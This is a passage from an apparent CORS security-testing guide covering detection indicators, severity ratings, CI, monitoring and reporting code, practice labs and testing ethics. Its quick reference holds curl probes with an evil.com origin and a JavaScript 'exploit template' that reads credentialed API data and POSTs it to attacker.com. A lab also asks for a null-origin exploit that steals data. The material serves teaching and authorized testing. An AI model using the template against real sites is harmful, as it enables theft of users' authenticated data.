            # Test if WebSocket has CORS restrictions
            ws.send("test")
            result = ws.recv()
            
            ws.close()
            
            return {
                'websocket_available': True,
                'url': ws_url,
                'response': result,
                'bypass_possible': True,
                'severity': 'medium'
            }
            
        except Exception as e:
            return {
                'websocket_available': False,
                'error': str(e)
            }
```

## Detection Indicators

### CORS Misconfiguration Artifacts
- Access-Control-Allow-Origin reflecting any origin
- Access-Control-Allow-Origin: null accepted
- Access-Control-Allow-Origin: * with credentials
- Missing Access-Control-Allow-Origin header
- Overly permissive Access-Control-Allow-Methods
- Overly permissive Access-Control-Allow-Headers
- Missing Access-Control-Max-Age header
- Missing Vary: Origin header

### Exploitation Artifacts
- Cross-origin requests with credentials
- Data exfiltration via CORS
- CSRF attacks bypassing same-origin policy
- Unauthorized API access from external origins
- Token theft via CORS vulnerabilities

## Impact Assessment

### Vulnerability Severity
- **Critical**: Origin reflection with credentials, full data theft
- **High**: Null origin with credentials, subdomain trust with credentials
- **Medium**: Wildcard without credentials, origin reflection without credentials
- **Low**: Overly permissive methods/headers, missing security headers

### Business Impact
- **Data Breach**: Theft of sensitive user data
- **Account Takeover**: Authentication bypass via CORS
- **CSRF Attacks**: Bypass of CSRF protections
- **Reputation Damage**: Public disclosure of vulnerabilities
- **Compliance Violations**: Failure to protect user data

## Common Pitfalls

### Testing Pitfalls
- **Browser Differences**: CORS behavior varies between browsers
- **Caching Issues**: Cached CORS responses may affect testing
- **Rate Limiting**: Aggressive testing may trigger rate limits
- **False Positives**: Misinterpreting normal behavior
- **Incomplete Testing**: Not testing all possible origins
- **Missing Context**: Not understanding application-specific behavior
- **Timing Issues**: CORS headers may be added by proxies
- **Error Handling**: Not handling request errors gracefully

### Implementation Pitfalls
- **Overly Complex Logic**: CORS validation logic too complex
- **Insufficient Logging**: Not logging CORS policy violations
- **No Error Handling**: Not handling invalid origins properly
- **Missing Documentation**: Poor documentation of CORS policy
- **No Monitoring**: Not monitoring for CORS policy changes
- **Hardcoded Origins**: Hardcoding allowed origins instead of configuration

## Integration Points

### CI/CD Integration
```yaml
# GitHub Actions workflow
name: CORS Security Testing
on: [push, pull_request]

jobs:
  cors-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.9'
      - name: Install dependencies
        run: pip install -r requirements.txt
      - name: Run CORS tests
        run: python -m cors_tester scan --config config.yaml
      - name: Upload results
        uses: actions/upload-artifact@v3
        with:
          name: cors-results
          path: results/
```

### Monitoring Integration
```python
# Real-time CORS monitoring
import time
from datetime import datetime

class CORSMonitor:
    def __init__(self):
        self.alerts = []
        self.baselines = {}
    
    def monitor_cors_policy(self, urls: List[str], 
                           interval: int = 3600):
        """Monitor CORS policy changes"""
        while True:
            for url in urls:
                current_policy = self._get_cors_policy(url)
                
                if url in self.baselines:
                    if current_policy != self.baselines[url]:
                        self.send_alert(url, current_policy)
                
                self.baselines[url] = current_policy
            
            time.sleep(interval)
    
    def _get_cors_policy(self, url: str) -> Dict:
        """Get current CORS policy"""
        try:
            response = requests.get(
                url,
                headers={'Origin': 'https://test.com'},
                timeout=30
            )
            
            return {
                'acao': response.headers.get('Access-Control-Allow-Origin', ''),
                'acac': response.headers.get('Access-Control-Allow-Credentials', ''),
                'acam': response.headers.get('Access-Control-Allow-Methods', ''),
                'acah': response.headers.get('Access-Control-Allow-Headers', ''),
            }
            
        except requests.RequestException:
            return {}
    
    def send_alert(self, url: str, new_policy: Dict):
        """Send alert for policy change"""
        alert = {
            'url': url,
            'new_policy': new_policy,
            'timestamp': datetime.now().isoformat()
        }
        self.alerts.append(alert)
```

### Reporting Integration
```python
class CORSReporter:
    def generate_html_report(self, scan_results: List[Dict]) -> str:
        """Generate HTML report for CORS findings"""
        html = '''
<!DOCTYPE html>
<html>
<head>
    <title>CORS Security Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .vulnerability {{ border: 1px solid #ccc; padding: 10px; margin: 10px 0; }}
        .critical {{ border-color: #ff0000; background-color: #ffe6e6; }}
        .high {{ border-color: #ff6600; background-color: #fff2e6; }}
        .medium {{ border-color: #ffcc00; background-color: #fff9e6; }}
        .low {{ border-color: #00cc00; background-color: #e6ffe6; }}
    </style>
</head>
<body>
    <h1>CORS Security Report</h1>
        '''
        
        for result in scan_results:
            html += f'<h2>{result["url"]}</h2>'
            
            for vuln in result.get('vulnerabilities', []):
                severity = vuln['severity']
                html += f'''
                <div class="vulnerability {severity}">
                    <h3>{vuln['vulnerability_type']}</h3>
                    <p><strong>Severity:</strong> {severity}</p>
                    <p><strong>Origin:</strong> {vuln['origin']}</p>
                    <p><strong>ACAO:</strong> {vuln['acao']}</p>
                    <p><strong>ACAC:</strong> {vuln['acac']}</p>
                    <p><strong>Evidence:</strong> {vuln['evidence']}</p>
                </div>
                '''
        
        html += '''
</body>
</html>
        '''
        
        return html
```

## Practice Labs

### Lab 1: Origin Reflection Testing
Create a CORS origin reflection tester that:
1. Tests various origin values
2. Identifies reflection vulnerabilities
3. Generates proof-of-concept exploits
4. Documents findings with evidence

### Lab 2: Null Origin Exploitation
Build a null origin exploit that:
1. Uses sandboxed iframes
2. Bypasses origin restrictions
3. Steals sensitive data
4. Demonstrates real-world impact

### Lab 3: Subdomain Trust Exploitation
Develop a subdomain trust tester that:
1. Identifies trusted subdomains
2. Tests for subdomain takeover
3. Chains with CORS misconfiguration
4. Demonstrates full compromise

### Lab 4: CORS Policy Analyzer
Create a CORS policy analyzer that:
1. Analyzes current configuration
2. Identifies security issues
3. Generates recommendations
4. Tracks policy changes

### Lab 5: Comprehensive CORS Scanner
Build a complete CORS scanning suite that:
1. Integrates all testing components
2. Provides unified reporting
3. Supports automated testing
4. Offers dashboard visualization

## Ethics

### Responsible CORS Testing
- **Authorization**: Only test applications with explicit permission
- **Scope Respect**: Stay within authorized testing boundaries
- **Data Handling**: Treat all captured data as potentially sensitive
- **Impact Awareness**: Be aware of potential impact on production systems
- **Credential Security**: Don't log or expose credentials
- **Disclosure**: Report findings through responsible channels
- **Documentation**: Maintain audit trail of all testing activities
- **Privacy**: Handle personal data according to regulations
- **Rate Limiting**: Implement delays to avoid denial of service
- **Cleanup**: Remove test data and artifacts after testing

## Quick Reference

### CORS Headers Reference
```yaml
Access-Control-Allow-Origin: <origin> | *
Access-Control-Allow-Credentials: true | false
Access-Control-Allow-Methods: <method>[, <method>]*
Access-Control-Allow-Headers: <header>[, <header>]*
Access-Control-Expose-Headers: <header>[, <header>]*
Access-Control-Max-Age: <delta-seconds>
Access-Control-Request-Method: <method>
Access-Control-Request-Headers: <header>[, <header>]*
```

### Common CORS Misconfigurations
1. **Origin Reflection**: Reflecting any origin in ACAO
2. **Null Origin**: Accepting "null" as valid origin
3. **Wildcard with Credentials**: ACAO: * with ACAC: true
4. **Subdomain Trust**: Trusting any subdomain
5. **Overly Permissive Methods**: Allowing dangerous methods
6. **Overly Permissive Headers**: Allowing custom headers

### Testing Commands
```bash
# Test origin reflection
curl -H "Origin: https://evil.com" https://target.com

# Test null origin
curl -H "Origin: null" https://target.com

# Test preflight
curl -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" https://target.com

# Check CORS headers
curl -I -H "Origin: https://test.com" https://target.com
```

### Exploit Templates
```javascript
// Basic CORS exploit
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://target.com/api/data", true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
        // Send to attacker
        fetch("https://attacker.com/collect", {
            method: "POST",
            body: xhr.responseText
        });
    }
};
xhr.send();
```

### Troubleshooting Quick Fixes
1. **False positives**: Verify manually with browser dev tools
2. **Browser differences**: Test in multiple browsers
3. **Caching issues**: Add cache-busting parameters
4. **Rate limiting**: Add delays between requests
5. **Proxy issues**: Test without proxy first
6. **SSL issues**: Verify certificate validity
7. **Timeout issues**: Increase timeout values
8. **Error handling**: Handle network errors gracefully
